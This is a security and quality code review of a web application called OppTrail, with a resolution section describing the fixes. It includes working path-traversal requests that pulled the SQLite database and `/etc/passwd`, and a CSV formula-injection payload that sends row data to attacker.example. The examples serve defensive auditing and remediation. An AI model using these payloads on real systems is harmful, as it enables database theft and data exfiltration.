# Code Review — OppTrail

Reviewed commit: `384f1e1` ("Accept final MVP gate"), branch `main`.
Review date: 2026-09-06.
Scope: full codebase — backend (`backend/app`, `backend/tests`), frontend
(`frontend/app`), Docker packaging, scripts, and conformance to `AGENTS.md` /
`docs/PLAN.md`.

## Verdict

The MVP is feature-complete against the 19 business requirements and the code is
consistently written: small modules, parameterized SQL, server-side permission
checks on every route, 93% backend line coverage. The architecture matches the
plan.

At review time it was **not** ready to be accepted as a final gate, for three
reasons: an unauthenticated path-traversal hole that exposed the whole database,
a red test suite, and a timestamp format/timezone split that corrupted timeline
ordering, date filtering, and stalled detection.

**Update — all Critical, High, and Medium findings (1-9) have since been fixed
and verified.** Most of the Low-severity items in finding 10 were left open by
choice, and the v2 phases have closed them one at a time as the milestone that
owned each came round; see "Still open" at the end for what remains.

## Findings by severity

| # | Severity | Finding | Location | Status |
|---|----------|---------|----------|--------|
| 1 | Critical | Unauthenticated path traversal exposes the whole database | `backend/app/main.py:56` | Fixed |
| 2 | High | Unvalidated `event_timestamp` permanently 500s the dashboard for every user on the opportunity | `backend/app/routes_opportunities.py:22` | Fixed |
| 3 | High | Two timestamp formats and two timezones break ordering, filtering, and stalled detection | `backend/app/timeline_utils.py:23`, `frontend/app/page.tsx:181` | Fixed |
| 4 | High | Editors can destroy the owner's timeline, and no deletion is ever audited | `backend/app/routes_timeline.py:381`, `backend/app/routes_opportunities.py:282` | Fixed |
| 5 | Medium | Test suite fails on `main`; the assertion depends on the wall clock | `backend/tests/test_timeline.py:158` | Fixed |
| 6 | Medium | CSV export is vulnerable to spreadsheet formula injection | `backend/app/export_service.py:133` | Fixed |
| 7 | Medium | Comment delete button is shown to editors who are not allowed to use it | `frontend/app/page.tsx:1651` | Fixed |
| 8 | Medium | No confirmation on any destructive action | `frontend/app/page.tsx:1225` | Fixed |
| 9 | Medium | PDF export has no automated coverage at all | `backend/tests/test_export.py:135` | Fixed |
| 10 | Low | Eight low-severity items (see below) | various | Open |

---

## 1. Critical — Unauthenticated path traversal exposes the entire database

`backend/app/main.py:56-64`

```python
@app.get("/{path:path}", include_in_schema=False)
def serve_frontend(path: str):
    requested_path = frontend_dir / path
    if requested_path.is_file():
        return FileResponse(requested_path)
```

`path` comes straight from the URL and is joined onto `frontend_dir` with no
containment check. Starlette hands over the percent-decoded value, so `..`
segments survive routing and escape the static directory.

Verified against the running app, using the container's real layout
(`FRONTEND_STATIC_DIR=/app/frontend-out`, `DATABASE_URL=sqlite:////data/app.db`):

```
GET /%2e%2e/secret.txt              -> 200, "TOP SECRET - outside the static dir"
GET /%2e%2e/%2e%2e/data/app.db      -> 200, 110592 bytes
                                       starts with b'SQLite format 3\x00'
                                       contains b'$2b$'  (bcrypt hashes)
```

No session cookie is required — this route is outside every auth dependency. An
attacker who can reach port 8000 downloads the database, cracks or simply reuses
the `sessions.id` values inside it, and is logged in as any user. Every other
permission control in the codebase is bypassed by this one line.

**Fix.** Resolve the candidate path and confirm it is inside the static root
before serving it:

```python
@app.get("/{path:path}", include_in_schema=False)
def serve_frontend(path: str):
    static_root = frontend_dir.resolve()
    requested_path = (static_root / path).resolve()
    if requested_path.is_relative_to(static_root) and requested_path.is_file():
        return FileResponse(requested_path)
    ...
```

Add a regression test asserting `GET /%2e%2e/%2e%2e/etc/passwd` returns the SPA
index rather than a file. `serve_frontend` is currently the largest untested
block in the backend (`main.py` lines 58-66 are uncovered), which is why this
survived to the final gate.

---

## 2. High — One malformed timestamp permanently breaks the dashboard

`backend/app/routes_opportunities.py:22-23` and `backend/app/schemas.py:154`

`TimelineEntryCreate.event_timestamp` is typed `str` with no validation, and the
value is stored verbatim. `is_opportunity_stalled` later parses every stored
timestamp with no error handling:

```python
def parse_activity_timestamp(value: str) -> datetime:
    return datetime.fromisoformat(value.replace(" ", "T")).replace(tzinfo=UTC)
```

Verified:

```
POST /api/opportunities/1/timeline {"title":"bad","event_timestamp":"not-a-timestamp"}
  -> 201 Created
GET  /api/opportunities
  -> ValueError: Invalid isoformat string: 'not-a-timestamp'  (HTTP 500)
```

The damage is not confined to one row. `list_opportunities`
(`routes_opportunities.py:157`) calls `is_opportunity_stalled` for *every*
accessible opportunity, so a single bad entry takes down the whole dashboard —
and it takes it down for the owner and every colleague the opportunity is shared
with, not just the person who wrote it. Because the row is persisted, the
failure does not clear on reload; the dashboard stays broken until someone edits
the database by hand. An editor on a shared opportunity can do this to the owner
with one API call.

The browser UI never sends a bad value (`<input type="datetime-local">`
constrains it), which is why this was never seen manually. That is exactly the
gap the plan warns about: "All endpoints [...] enforce the Permissions Model
from AGENTS.md server-side (not just hidden in the UI)." The same reasoning
applies to input validation.

**Fix.** Validate at the schema boundary, where a bad value becomes a 422 the
caller can act on rather than a 500 for everyone else. `expected_close_date`
and `follow_up_date` (`schemas.py:77`, `schemas.py:155`) have the same gap:

```python
event_timestamp: AwareDatetime   # or datetime, serialized back to ISO-8601 UTC
```

Storing a real datetime type also removes the need for `parse_activity_timestamp`
entirely, and is the root fix for finding 3.

---

## 3. High — Two timestamp formats and two timezones in one column

`backend/app/timeline_utils.py:23`, `frontend/app/page.tsx:181-186`

`timeline_entries.event_timestamp` receives values from two writers that
disagree on both format and timezone:

| Writer | Example value | Separator | Timezone |
|--------|---------------|-----------|----------|
| System entries (`timeline_utils.py:23`, `CURRENT_TIMESTAMP`) | `2026-09-05 12:00:00` | space | UTC |
| User entries (`page.tsx:181`, `datetime-local` input) | `2026-09-05T09:00:00` | `T` | browser local |

Because the column is `TEXT` and every comparison is lexicographic, ASCII
ordering decides the outcome — and `' '` (0x20) sorts before `'T'` (0x54).
Verified:

```python
sys_entry  = "2026-09-05 12:00:00"   # system, noon
user_entry = "2026-09-05T09:00:00"   # user, 9am
frm        = "2026-09-05T00:00:00"   # "from" filter, start of that day

sys_entry  >= frm  ->  False    # noon entry excluded by a midnight filter
user_entry >= frm  ->  True
sorted([sys_entry, user_entry]) -> ['2026-09-05 12:00:00', '2026-09-05T09:00:00']
```

Three concrete consequences:

- **Filtering (`routes_timeline.py:179-185`).** Setting a "from" date to the
  start of a day silently drops every system-generated entry from that same day
  — the stage changes and sharing events that requirement 10 exists to capture.
  The reverse holds for "to": system entries leak in past the cutoff.
- **Ordering (`routes_timeline.py:220`, `ai_service.py:41`,
  `export_service.py:36`).** Within a date, system entries always sort before
  user entries regardless of clock time. The timeline view, the AI context, and
  the PDF export all render out of chronological order. This directly
  contradicts the Phase 5 acceptance criterion ("exported PDF renders all
  entries [...] in chronological order").
- **Timezone drift.** `parse_activity_timestamp` stamps `tzinfo=UTC` onto values
  the browser wrote in local time, so the 14-day stalled threshold
  (requirement 16) is off by the user's UTC offset, and a system entry and a user
  entry created in the same second display different clock times.

**Fix.** Normalize on write. Store ISO-8601 UTC with an explicit offset in both
paths: have `create_system_timeline_entry` pass an application-generated
`datetime.now(UTC).isoformat()` instead of `CURRENT_TIMESTAMP`, have the frontend
send `new Date(...).toISOString()` rather than the raw `datetime-local` string,
and convert to local time only at render. The same mixed-format problem exists
in `notes.created_at` and `comments.created_at`, which the stalled query also
reads. A one-off migration is needed for existing rows.

---

## 4. High — Editors can destroy the owner's timeline, and no deletion is audited

The permission model is inverted: the least destructive operation is the only
one that is protected.

Verified with an owner and an editor on a shared opportunity:

```
editor edits the owner's note      -> 200
editor deletes the owner's comment -> 403   <- the only thing blocked
editor deletes the owner's note    -> 204
editor deletes the owner's entry   -> 204   (cascades to its notes and comments)

owner reads GET /api/opportunities/{id}/audit-log
  -> ['share_added']                        <- no record of any of the above
```

Two separate defects:

**4a. Authorship is enforced for comments only.** `delete_comment`
(`routes_timeline.py:704`) checks `role != "owner" and comment["created_by"] !=
user["id"]`. `update_note` (`:503`), `delete_note` (`:607`),
`update_timeline_entry` (`:348`), and `delete_timeline_entry` (`:393`) check only
`require_timeline_write`, so any editor may rewrite or remove any colleague's
content. `AGENTS.md` grants editors "add/edit timeline entries, notes,
comments" and is silent on deleting other people's work, so this is a decision
that was never actually made — but shipping the strict rule on comments and the
permissive rule on the objects that *contain* comments cannot be the intended
design either way. Pick one and apply it consistently; author-or-owner for
deletes matches the comment rule and the "nothing silently disappears" standard.

**4b. Deletions are absent from the audit log.** `create_audit_log_entry` is
called from `routes_sharing.py` only — three call sites, all share-related.
Requirement 18 asks for a "Full audit log per opportunity (sharing/role changes,
**deletions**), visible to the Owner," and coding standard 6 says "nothing on a
shared sales record silently disappears." Today a soft-deleted note disappears
from the owner's view with no trace anywhere they can see; the `deleted_at`
column is only reachable through direct database access. Note *edits* are
recoverable via `note_versions`, so the gap is specific to deletes.

**Fix.** Add `create_audit_log_entry` calls to `delete_timeline_entry`,
`delete_note`, `delete_comment`, and `delete_opportunity`, recording the actor,
the object type and id, and enough of the body to identify what was removed.
Then decide 4a deliberately and add a test for whichever rule you choose.

---

## 5. Medium — The test suite is red, and the assertion depends on today's date

`backend/tests/test_timeline.py:158-164`

`uv run pytest` on a clean checkout: **1 failed, 28 passed**.

```
test_timeline_filters_keyword_type_date_and_author
  assert ['Opportunity created', 'Proposal email'] == ['Proposal email']
```

The test creates an opportunity — which auto-generates an "Opportunity created"
system entry stamped with the *current* wall-clock time — then asserts that a
hardcoded window of `2026-09-05T00:00:00` to `2026-09-30T23:59:59` returns only
`Proposal email`.

The pass/fail result is a function of the day you run it, via the finding-3
comparison bug:

- Before 2026-09-05: the system entry is outside the window. Passes.
- On 2026-09-05: the entry is `"2026-09-05 HH:MM:SS"`, which sorts *below*
  `"2026-09-05T00:00:00"` because space precedes `T`. Excluded by accident.
  Passes.
- 2026-09-06 through 2026-09-30 (now): the date prefix is unambiguously inside
  the window, so it is included. **Fails.**
- From 2026-10-01: outside the window again. Passes.

So the suite was green when the gate was accepted and went red on its own the
following day. Worth noting that the coincidental pass on 2026-09-05 was the
finding-3 bug masking itself inside the test written to catch it.

**Fix.** Make the fixture time-independent: pass an explicit `event_timestamp`
for the system entry, or assert against a window derived from the entries the
test itself created rather than hardcoded dates. Grep the suite for other
hardcoded 2026 dates before calling this done. Adding the suite to a CI check
would have surfaced this the same day.

---

## 6. Medium — CSV export is open to spreadsheet formula injection

`backend/app/export_service.py:133-216`

Entry titles, entry bodies, note bodies, and comment bodies are written to CSV
verbatim. A field beginning with `=`, `+`, `-`, or `@` is interpreted as a
formula by Excel, LibreOffice, and Google Sheets when the file is opened.

This is a realistic path here rather than a theoretical one: the whole point of
sharing is that colleagues write notes on each other's opportunities, and the
whole point of CSV export is that someone downloads it and opens it in Excel. A
note body of `=HYPERLINK("https://attacker.example/?d="&A1,"Click")` exfiltrates
row data on click.

Note that the PDF path is already handled correctly — `render_export_html`
escapes every interpolated value (`export_service.py:235-274`) — and the
`Content-Disposition` filename is slugified to `[A-Za-z0-9-]`
(`export_service.py:9`), so header injection is not possible. CSV is the one
unguarded output.

**Fix.** Prefix a single quote, or wrap in quotes and prepend a tab, for any
value whose first character is in `=+-@\t\r`. One helper applied in
`export_data_to_csv` covers every field.

---

## 7. Medium — Comment delete button is shown to editors who cannot use it

`frontend/app/page.tsx:1651`

The button is gated on `canWriteSelectedTimeline` (owner or editor), but the
backend allows deletion only by the comment's author or the owner
(`routes_timeline.py:704`). An editor clicking Delete on a colleague's comment
gets "Only the author or owner can delete this comment" in the error banner — a
dead-end control.

The same gate is used for the note Edit/Delete buttons (`page.tsx:1583`,
`:1595`), which currently matches the backend only because of finding 4a. If you
tighten note deletes as recommended there, update both gates together.

**Fix.** Gate on `selectedOpportunity.current_user_role === "owner" ||
comment.created_by === user.id`. The data needed is already on the client.

---

## 8. Medium — No confirmation on any destructive action

`frontend/app/page.tsx:1225` (opportunity), `:1338` (remove share), `:1556`
(entry), `:1595` (note), `:1651` (comment)

Every delete fires immediately on click. `deleteOpportunity` soft-deletes the
opportunity plus every entry, note, comment, and share beneath it
(`routes_opportunities.py:295-345`) from a button sitting directly beside "Edit"
on the dashboard card. There is no undo in the UI, and — per finding 4b — no
audit entry recording that it happened.

Soft deletes mean the data is recoverable by a database administrator, which is
the stated design. They do not help the user who just lost their board.

**Fix.** A `confirm()` naming the object is enough for MVP, and is warranted at
minimum on opportunity delete and share removal.

---

## 9. Medium — PDF export has no automated coverage

`backend/tests/test_export.py:135` and `:169`

Both export tests monkeypatch the renderer away:

```python
monkeypatch.setattr("app.routes_export.export_data_to_pdf", lambda data: b"%PDF-1.7")
```

The assertions then confirm that the response starts with `%PDF` — which is the
stub echoing itself. `render_export_html` and `export_data_to_pdf`
(`export_service.py:219-288`, 70% file coverage, lines 220-288 uncovered) are
never executed by the suite. Requirement 7 and the Phase 5 acceptance criterion
both rest on this path, and it is verified only by manual inspection.

The stub is understandable — WeasyPrint needs native libraries that are not
present on a macOS host, and it fails to import there. But that means PDF export
is currently unverifiable outside `docker run`.

Two things I did check in the container image, since they are the usual failure
modes:

- **Fonts are present.** `libpangoft2-1.0-0` pulls in DejaVu, so
  `font-family: Arial, sans-serif` (`export_service.py:297`) resolves to DejaVu
  Sans rather than rendering blank. Worth knowing the PDF will not look like
  Arial. Only 6 font faces are installed and none cover CJK, so a note written
  in a non-Latin script will render as empty boxes.
- **Markdown is not rendered.** Note bodies are stored as Markdown and rendered
  as rich text in the browser (`page.tsx:210`), but the PDF escapes them as
  plain text (`export_service.py:247`). A note reading `**Budget approved**`
  appears in the PDF with literal asterisks. Requirement 17 asks for rich text;
  the export drops it.

**Fix.** Add a test that calls `render_export_html` directly — no WeasyPrint
needed — and asserts that entries appear in chronological order and that a note
body containing `<script>` is escaped. Guard the one true `export_data_to_pdf`
test with `pytest.importorskip("weasyprint")` so it runs in the container and
skips on a developer laptop.

---

## 10. Low-severity items

- **Duplicated reload calls.** `await loadOpportunities();` appears twice in a
  row at `page.tsx:581-582`, `:688-689`, and `:716-717` — copy-paste in
  `submitTimelineEntry`, `addNote`, and `deleteTimelineEntry`. Every entry and
  note write issues the dashboard query twice.
- **`session_secret` is dead configuration.** Declared at `settings.py:9` and
  documented in `README.md` and `.env.example`, but referenced nowhere. Sessions
  use random `secrets.token_urlsafe(32)` IDs stored in the database
  (`auth.py:29`), which needs no signing key. Either remove it or the README
  instructs users to set a value that does nothing.
- **`passlib` is unmaintained and already warns.** Every test run prints
  `(trapped) error reading bcrypt version` — `passlib` 1.7.4 (last released
  2020) probing a `bcrypt.__about__` attribute that no longer exists.
  `pyproject.toml` pins `bcrypt<5` to hold this together. `AGENTS.md` coding
  standard 1 asks for current, idiomatic libraries; calling the `bcrypt` package
  directly, or using `pwdlib`, drops both the pin and the warning.
- **Floating dependency versions.** `frontend/package.json` specifies `"next":
  "latest"`, `"react": "latest"`, `"typescript": "latest"` and five more.
  `package-lock.json` keeps `npm ci` reproducible today, but any lock refresh
  can jump a major version with no diff signal. Pin to caret ranges.
- **Timeline polling was planned but not built.** `docs/PLAN.md` states "the
  frontend polls the timeline endpoint on an interval while an opportunity view
  is open." There is no `setInterval` in the codebase — there is a manual
  Refresh button (`page.tsx:1257`). Either build it or correct the plan; right
  now two colleagues on one opportunity will not see each other's entries.
- **Notes and comments are composed in single-line `<input>` fields**
  (`page.tsx:1663`, `:1687`). Requirement 17 asks for "bold, links, bullet
  lists," and a bullet list cannot be typed without a newline. Note *editing*
  correctly uses a `<textarea>` (`page.tsx:1598`); creation should too.
- **The author filter asks for a numeric user ID.** `page.tsx:1400` is a raw
  number input labelled "Author ID". Requirement 12 asks for filtering by
  author; users do not know internal IDs. The participant list is already
  available from the shares endpoint — a `<select>` would cost little.
- **N+1 queries in two hot paths.** `list_opportunities` runs one
  three-way-UNION stalled query per opportunity (`routes_opportunities.py:157`),
  and `build_timeline_context` runs one query per entry plus one per note
  (`ai_service.py:73`, `:88`). Fine at MVP scale, and both are straightforward
  to batch the way `list_timeline` (`routes_timeline.py:229-256`) already does.
- **No logging anywhere.** `routes_ai.py:43` catches every exception from OpenAI
  and returns a bare 502 with the cause discarded. `AGENTS.md` coding standard 4
  requires root-causing issues with evidence; there is currently no evidence to
  collect. One `logger.exception` there would pay for itself.
- **Minor.** `fetch_export_data` returns `{"opportunity": None}` on a missing
  opportunity (`export_service.py:27`), but `require_opportunity_access` already
  raised 404 by then — dead branch, and standard 2 asks for no unnecessary
  defensive code. `conftest.py:13` mutates the global `settings.database_url`
  without restoring it. Expired `sessions` rows are never purged. There is no
  rate limit on `POST /api/auth/login`.

---

## What is working well

Worth recording, because these are the parts not to disturb while fixing the
above.

- **SQL injection.** Every user-supplied value is parameterized, including the
  dynamically assembled filter clauses in `list_timeline`
  (`routes_timeline.py:142-210`) and the `IN` placeholder lists. The two
  f-string `UPDATE` builders (`routes_opportunities.py:245`,
  `routes_timeline.py:356`) interpolate only Pydantic field names, which cannot
  be attacker-controlled.
- **Permission enforcement is server-side and consistent.** Every route resolves
  the role through `permissions.py` against the database rather than trusting the
  client, and unauthorized access returns 404 rather than 403, so opportunity
  existence does not leak. `permissions.py` is at 100% coverage.
- **The AI agent is read-only by construction, as specified.** `routes_ai.py`
  assembles a text context, calls `responses.create` with `store=False`, and
  returns a string. There is no tool surface to misuse — the guarantee comes
  from the architecture, not from the prompt, which is what `AGENTS.md` asked
  for. `test_ai_answer_uses_timeline_context_and_does_not_write` checks it.
- **XSS is handled properly on both render paths.** The frontend runs
  `rehype-sanitize` with an explicit `href` protocol allowlist of
  `http/https/mailto` (`page.tsx:166-178`), which blocks `javascript:` URLs in
  Markdown links; the PDF renderer escapes every interpolated value.
- **Soft deletes are applied consistently**, and every read query filters
  `deleted_at IS NULL` at each level of the entry/note/comment tree — including
  the cascade cases, which are tested.
- **Test coverage is genuinely good** where it exists: 93% backend lines, 29
  tests, and they target the right things — role matrices, soft-delete cascades,
  cross-user access denial, note version history. The gaps are specific
  (`serve_frontend`, PDF rendering), not general.

---

## Requirement conformance

| # | Requirement | Status |
|---|-------------|--------|
| 1 | User can sign in | Met |
| 2 | Three-level timeline tree | Met |
| 3 | Notes addable to any entry at any time | Met |
| 4 | Comments on any note | Met |
| 5 | Read-only AI sidebar | Met |
| 6 | Share as Viewer / Editor | Met |
| 7 | PDF export | Met, unverified (finding 9) |
| 8 | Dashboard grouped by stage | Met |
| 9 | Opportunity record fields | Met |
| 10 | Auto system entries | Met, but mis-ordered and mis-filtered (finding 3) |
| 11 | Entry types with color/icon | Met (color markers; no icons) |
| 12 | Search and filter | Partial — date range broken (finding 3), author filter needs an ID (finding 10) |
| 13 | @mentions notify | Met — but undiscoverable: the user must type a full email address, with no autocomplete or hint |
| 14 | Notification bell | Met |
| 15 | Note edit history | Met — `note_versions` is the strongest part of the data model |
| 16 | Stalled flag + follow-up reminder | Partial — threshold is timezone-skewed (finding 3) |
| 17 | Sanitized Markdown rich text | Partial — cannot enter multi-line Markdown (finding 10); not rendered in PDF (finding 9) |
| 18 | Full audit log incl. deletions | **Not met** — sharing only (finding 4b) |
| 19 | CSV / JSON export | Met, with an injection risk in CSV (finding 6) |

All six MVP non-goals were correctly respected — no attachments, no email or
calendar integration, no live co-editing, no public share links, no
organizations, no AI write access.

---

## Recommended order of work

1. Patch the path traversal (finding 1) and add a regression test. Everything
   else is secondary to this.
2. Fix the test suite (finding 5) so the build is green and can gate merges.
3. Normalize timestamps to ISO-8601 UTC on both write paths, validate them at
   the schema boundary, and migrate existing rows (findings 2 and 3 — one fix).
4. Add audit entries for all four delete paths, and settle the editor-versus-
   author rule for notes and entries (finding 4).
5. Escape CSV formula prefixes (finding 6).
6. Frontend: confirmation on destructive actions, correct the comment delete
   gate, and switch the note and comment composers to textareas (findings 7, 8,
   and the rich-text item in 10).
7. Cover `render_export_html` directly and gate the WeasyPrint test on the
   import (finding 9).

Findings 1 through 6 are the set I would want closed before re-running the final
MVP gate.


---

# Resolution

All findings from Critical through Medium (1-9) were fixed after the review.
Finding 10 (Low) was intentionally left open. The suite went from **28 passed,
1 failed** to **39 passed** in the container, with 10 new regression tests.

## What changed

**1 — Path traversal.** `serve_frontend` now resolves the requested path and
serves it only when `is_relative_to` the resolved static root
(`backend/app/main.py`). Verified live against the running container: every
traversal payload returns the SPA index instead of file contents.

```
GET /%2e%2e/%2e%2e/data/app.db        -> 200, index.html   (was: 110KB of SQLite)
GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd  -> 200, index.html
GET /%2e%2e%2f%2e%2e%2fdata/app.db    -> 200, index.html
```

`backend/tests/test_static_files.py` covers six traversal encodings plus the
normal serving and SPA-fallback paths. The guard test was confirmed to fail
against the original code before the fix was restored, so it genuinely pins the
behavior rather than passing vacuously.

**2 and 3 — Timestamps.** These shared one root cause and one fix. A new
`backend/app/time_utils.py` defines a single canonical format,
`%Y-%m-%dT%H:%M:%SZ` — fixed-width UTC, so lexicographic ordering in SQLite is
chronological ordering.

- `schemas.py` validates and normalizes `event_timestamp`, `follow_up_date`, and
  `expected_close_date` at the request boundary. Bad input is now a 422 at the
  point of entry instead of a 500 for everyone later.
- `create_system_timeline_entry` writes an application-generated canonical
  timestamp rather than SQLite's `CURRENT_TIMESTAMP`, so both writers agree.
- Every `DEFAULT CURRENT_TIMESTAMP` in `schema.sql` and every inline
  `CURRENT_TIMESTAMP` in the routes now emits the canonical format.
- `normalize_legacy_timestamps` in `database.py` rewrites existing rows across
  ten columns on startup. It uses SQLite's `strftime`, which returns NULL for
  values it cannot parse, so unreadable legacy rows are skipped rather than
  destroyed.
- `is_opportunity_stalled` computes the latest activity with `MAX()` in SQL and
  compares canonical strings. `parse_activity_timestamp` is gone, which removes
  the Python parse that turned one bad row into a dashboard-wide 500.
- The frontend converts at the boundary in both directions: `localInputToUtc`
  on write (entry form and both date filters), `parseTimestamp` and
  `formatTimestamp` on read, so times display in the viewer's local zone.
  Round-tripping was verified in UTC, America/Los_Angeles, and Asia/Tokyo.

Verified live — the system entry now sorts by real time and survives a
same-day filter, both of which failed before:

```
2026-09-06T11:48:40Z | Earlier today        chronological: True
2026-09-06T13:48:40Z | Opportunity created
?from=2026-09-06T00:00:00Z -> ['Earlier today', 'Opportunity created']

POST bad event_timestamp -> 422   (was 201)
GET  /api/opportunities  -> 200   (was 500, permanently)
```

**4 — Delete permissions and audit.** A new `require_delete_permission` in
`permissions.py` applies one rule to entries, notes, and comments alike:
deleting is limited to the item's author or the opportunity owner. Editors still
add and edit freely, matching the permissions model in `AGENTS.md`; note edits
remain recoverable through `note_versions`. All four delete paths now write an
audit entry (`timeline_entry_deleted`, `note_deleted`, `comment_deleted`,
`opportunity_deleted`), closing requirement 18. Verified live:

```
editor deletes owner's note  -> 403   (was 204)
editor deletes owner's entry -> 403   (was 204)
owner  deletes own note      -> 204
audit log: share_added, note_deleted {"author_id":1,"entry_id":2,"note_id":1}
```

**5 — Time-dependent test.** `test_timeline_filters_keyword_type_date_and_author`
now anchors its fixtures and its query window to `now` through a `days_ago`
helper, so the auto-generated system entry can never drift into the window.

**6 — CSV injection.** `escape_csv_value` prefixes any field starting with
`=`, `+`, `-`, `@`, tab, or carriage return with a single quote, applied to
every field of every row. Verified live: a note body of `=HYPERLINK(...)`
exports as `'=HYPERLINK(...)`.

**7 and 8 — Frontend safety.** A `canDelete(authorId)` helper mirrors the server
rule, so delete buttons only appear where the action will succeed. All five
destructive actions — opportunity, share, entry, note, comment — now confirm
first, naming what is about to be removed.

**9 — PDF coverage.** Two real tests replaced the self-referential stub:
`render_export_html` is asserted directly for chronological ordering and HTML
escaping (no WeasyPrint needed), and a full PDF render runs whenever the native
libraries are available, skipping cleanly on a developer laptop. In the
container the render test executes and passes — the suite reports 39 passed with
no skips there. The generated PDF is 11.7KB, starts with `%PDF-1.7`, and embeds
subsetted `DejaVu-Sans` and `DejaVu-Sans-Bold`, confirming text renders with a
real font. `font-family` now names DejaVu Sans explicitly rather than relying on
an Arial fallback that does not exist in the image.

## Verification performed

- `uv run pytest`: 38 passed, 1 skipped on macOS; **39 passed** inside the
  container, where the WeasyPrint test runs.
- `npm run typecheck` and `npm run lint`: clean.
- `docker build`: succeeds; the image was run and probed end to end for every
  finding above.
- The traversal regression test was confirmed to fail against the pre-fix code.

## Still open

- **Finding 10 (Low)** — the single-line composers are **closed**: milestone
  3.1 replaced every note, comment and entry-body composer with a TipTap editor
  storing Markdown (`frontend/app/RichTextEditor.tsx`,
  `frontend/lib/markdown.ts`), so a bullet list can be typed where it could not
  be before. The rest of the eight are addressed where a phase touched them
  (polling by ADR 0003's SSE work, the author filter by the timeline filter bar,
  logging by milestone 1.6) or remain as recorded.
- **Markdown in the PDF is closed (milestone 3.5).** `export_service.py` now
  renders entry, note and comment bodies through `markdown-it-py`
  (`render_markdown_to_safe_html`) instead of escaping them as plain text, so
  `**bold**` and a `- ` list render as markup rather than literal syntax. The
  requirement 17 gap this finding named is fully closed: the composer half in
  milestone 3.1, this half here. The rendered HTML is sanitized through the
  same `app/sanitize.py` allowlist the frontend's `rehype-sanitize` pass uses
  before WeasyPrint ever sees it, and the parser's own `html: False` option is
  set explicitly rather than trusted at its default (`commonmark`'s preset
  default is `html: True`) — two independent layers against a hostile body,
  both pinned by `backend/tests/test_export.py`.
